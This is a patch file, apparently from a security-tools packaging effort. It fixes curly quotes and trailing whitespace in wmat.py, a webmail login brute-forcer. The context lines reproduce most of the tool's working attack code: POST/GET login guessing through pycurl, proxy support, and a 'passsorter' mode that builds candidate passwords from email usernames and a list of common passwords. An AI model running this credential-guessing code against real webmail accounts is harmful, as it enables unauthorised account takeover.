@@ -1,0 +1,329 @@
+--- src/wmat/wmat.py	2015-04-20 13:56:18.000000000 +0200
++++ wmat.py	2018-11-25 14:09:46.183332706 +0100
+@@ -31,7 +31,7 @@
+ def error():
+ 
+     print "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+-    print "WEB MAIL AUTH TOOL (Ivan Markovic, http://security-net.biz/)”
++    print "WEB MAIL AUTH TOOL (Ivan Markovic, http://security-net.biz/)"
+     print "\nUsage:"
+     print "-u usernames_file required (except in passsorter mode)"
+     print "-p passwords_file required (except in passsorter mode)"
+@@ -50,8 +50,8 @@
+     print "python wmat.py -u usernames_example.txt -p passwords_example.txt --url webmail.domain.tld --pattern patterns/dummy.wmat.xml --proxy xxx.xxx.xxx.xxx:8080 --proxyup username:password\n"
+     print "python wmat.py --passsorter usernames_example.txt --url webmail.domain.tld --pattern patterns/dummy.wmat.xml --bell -t 5\n"
+     sys.exit()
+-    
+-    
++
++
+ # DEF READ FROM FILE
+ def readFromFile(input):
+     try:
+@@ -60,13 +60,13 @@
+     except:
+         print "\nERROR: File ",input," is missing!\n"
+         sys.exit()
+-        
+-        
++
++
+ # DEF READ PATTERN ITEMS
+ def readPattern():
+ 
+     global action_url, method, useragent, referer, username_field, password_field, add_fields, success
+-    
++
+     # Username field
+     username_field = getText(pattern.getElementsByTagName("username")[0].childNodes);
+ 
+@@ -81,12 +81,12 @@
+ 
+     # HTTP method
+     method = getText(pattern.getElementsByTagName("method")[0].childNodes);
+-    if method == "": 
++    if method == "":
+         method = "post"
+-        
+-    # User Agent    
++
++    # User Agent
+     useragent = str(getText(pattern.getElementsByTagName("useragent")[0].childNodes));
+-    if useragent == "": 
++    if useragent == "":
+         useragent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
+ 
+     # Additional fields
+@@ -96,7 +96,7 @@
+     # Referer
+     referer = str(getText(pattern.getElementsByTagName("referer")[0].childNodes));
+     referer = referer.replace("[amp]","&")
+-    
++
+ 
+ # READ PATTERN
+ def getText(nodelist):
+@@ -118,16 +118,16 @@
+ def attack(ux,px):
+     global action_url, method, finded_buf, proxy, proxyUP, useragent, referer, username_field, password_field, add_fields, https, urlx, success
+     tempx = ''
+-    
++
+     t = CB()
+     myCurl = pycurl.Curl()
+-    
++
+     # Proxy
+     if proxy <> None:
+         myCurl.setopt(pycurl.PROXY, proxy)
+         if proxyUP <> None:
+-            myCurl.setopt(pycurl.PROXYUSERPWD, proxyUP) 
+-    
++            myCurl.setopt(pycurl.PROXYUSERPWD, proxyUP)
++
+     # Https
+     if https == 1:
+         myCurl.setopt(pycurl.SSLVERSION, 3)
+@@ -142,34 +142,34 @@
+     myCurl.setopt(pycurl.WRITEFUNCTION, t.body_callback)
+     myCurl.setopt(pycurl.CONNECTTIMEOUT, 60)
+     myCurl.setopt(pycurl.TIMEOUT, 600)
+-    
+-    
++
++
+     # Create URL/DATA
+     LOGIN_DATA = username_field + '=' + ux + '&' + password_field + '=' + px + add_fields
+     LOGIN_DATA = LOGIN_DATA.replace("\n","")
+-    
++
+     if method == 'post': # POST
+         urlparse.urlparse(str(LOGIN_DATA))
+-        
++
+         myCurl.setopt(pycurl.URL, urlx)
+         myCurl.setopt(pycurl.POSTFIELDS, str(LOGIN_DATA))
+         myCurl.setopt(pycurl.POST, 1)
+-        
++
+         print "POST url/data: ", urlx, " | ",LOGIN_DATA,"\n"
+     else: # GET
+         LOGIN_URL = urlx + '?' + LOGIN_DATA
+         urlparse.urlparse(str(LOGIN_URL))
+-        
++
+         myCurl.setopt(pycurl.URL, str(LOGIN_URL))
+-        
++
+         print "GET url/data: ", LOGIN_URL,"\n"
+-    
++
+     # Perform
+     myCurl.perform()
+ 
+     # Clean up and close out
+     myCurl.close()
+-    
++
+     # Look at code
+     where = t.contents.find(str(success))
+     if where <> -1:
+@@ -179,42 +179,42 @@
+         if method == 'post':
+             finded_buf += "POST url/data: " + urlx + " | " + LOGIN_DATA + "\n"
+         else:
+-            finded_buf += "GET url/data: " + LOGIN_URL + "\n"    
+-            
+-    
++            finded_buf += "GET url/data: " + LOGIN_URL + "\n"
++
++
+ # DEF WRITE TO FILE
+ def writeFile(filename, buffer):
+     finded = open(filename,"w")
+     finded.write(buffer)
+     finded.close
+ 
+-# DEF PasssorterGen 
++# DEF PasssorterGen
+ # Default password generator (Idea: Dejan Levaja <dejan.levaja@netsec.rs>)
+ def PasssorterGen(x):
+ 
+-    global timeout    
+-    
++    global timeout
++
+     commonPass = ("123", "1234", "12345", "123456", "1234567890", "abc", "a1b2c3", "abc123", "computer", "internet", "password", "P@ssw0rd", "P@ssword", "root", "admin", "administrator", "cisco", "qwerty", "secret", "test", "xxx", "www")
+-    
++
+     try:
+         emails = readFromFile(x)
+     except:
+         emails = [x]
+ 
+     for email in emails:
+-        
++
+         # Only username
+         bezdomena = email.split("@")[0].lower()
+-        
++
+         # Dot
+         pazzwords = isThereADot(bezdomena)
+-        
++
+         # Upper/Caps
+         passUpperCaps = UpperAndCaps(pazzwords)
+-        
++
+         # Numbers
+         passNumeric = addNumbersToTheEnd(pazzwords)
+-        
++
+         all=[]
+         for x in (pazzwords):
+              all.append(x)
+@@ -224,14 +224,14 @@
+             all.append(x)
+         for x in (commonPass):
+             all.append(x.replace("\n",""))
+-                
++
+         # writeFile(email+".passorter",all)
+         for pas in all:
+             if timeout > 0:
+                 time.sleep(timeout)
+             attack(email,pas)
+-            
+-        
++
++
+ # DEF DOT
+ def isThereADot(bezdomena):
+ 	# Dot ?
+@@ -245,7 +245,7 @@
+ 	return passwords
+ 
+ 
+-# DEF ADD NUMBERS	
++# DEF ADD NUMBERS
+ def addNumbersToTheEnd(passwords):
+ 	passNumeric=[]
+ 	for lozinka in passwords:
+@@ -254,22 +254,22 @@
+ 		passNumeric.append(lozinka+"1234")
+ 		passNumeric.append(lozinka+"12345")
+ 		passNumeric.append(lozinka+"123456")
+-		
++
+ 	return passNumeric
+-	
++
+ 
+ # DEF UPPER AND CAPS
+ def UpperAndCaps(passwords):
+ 	passUpperAndCaps=[]
+ 	for lozinka in passwords:
+ 		passUpperAndCaps.append(lozinka.upper())
+-		if "." in lozinka: 
++		if "." in lozinka:
+ 			prvideo = (lozinka.split(".")[0]).capitalize()
+ 			drugideo = (lozinka.split(".")[1]).capitalize()
+ 			passUpperAndCaps.append(prvideo + "." + drugideo)
+ 		else:
+ 			passUpperAndCaps.append(lozinka.capitalize())
+-		
++
+ 	return passUpperAndCaps
+ 
+ 
+@@ -284,8 +284,8 @@
+ print "***\tweb mail auth tool\t***"
+ print "***\twmat.py v 0.1\t\t***"
+ print "***\tcoded by Ivan Markovic\t***"
+-print "***\thttp://security-net.biz\t***”
+-print "***\tivanm@security-net.biz\t***”
++print "***\thttp://security-net.biz\t***"
++print "***\tivanm@security-net.biz\t***"
+ print "***\twmat.py -? for help\t***"
+ print "***********************************"
+ 
+@@ -302,10 +302,10 @@
+ parser.add_option("--passsorter", dest="passsorter")
+ parser.add_option("--bell", action="store_true", default=False)
+ parser.add_option("-?", action="store_true", dest="err")
+-(options, args) = parser.parse_args()				  
++(options, args) = parser.parse_args()
+ 
+ if len(sys.argv) >= 3:
+-	
++
+     # Uzimam listu korisnickih imena
+     if options.usernames:
+         usernames = readFromFile(options.usernames)
+@@ -322,47 +322,47 @@
+     if options.url:
+         url = options.url
+     else:
+-        url = None	
++        url = None
+ 
+     # Pattern
+     if options.pattern:
+         pattern = xml.dom.minidom.parse(options.pattern)
+     else:
+-        pattern = None		
++        pattern = None
+ 
+     # Timeout (sec)
+     if options.timeout:
+         timeout = float(options.timeout)
+     else:
+-        timeout = 0	
+-        
++        timeout = 0
++
+     # File to write finded items
+     if options.write:
+         fwrite = options.write
+     else:
+         fwrite = None
+-        
++
+     # Proxy IP:PORT
+     if options.proxy:
+         proxy = str(options.proxy)
+     else:
+         proxy = None
+-        
++
+     # Proxy Username:Password
+     if options.proxyup:
+         proxyUP = str(options.proxyup)
+     else:
+         proxyUP = None
+-        
++
+     # Passorter
+     if options.passsorter:
+         passorter = options.passsorter
+     else:
+         passorter = None
+-        
++
+     if options.err:
+         error()
+-    
++
+ else:
+ 	error()
+ 
+@@ -407,7 +407,7 @@
+             if timeout > 0:
+                 time.sleep(timeout)
+             attack(username,password)
+-            
++
+ 
+ # Make list with finded items
+ if options.write:
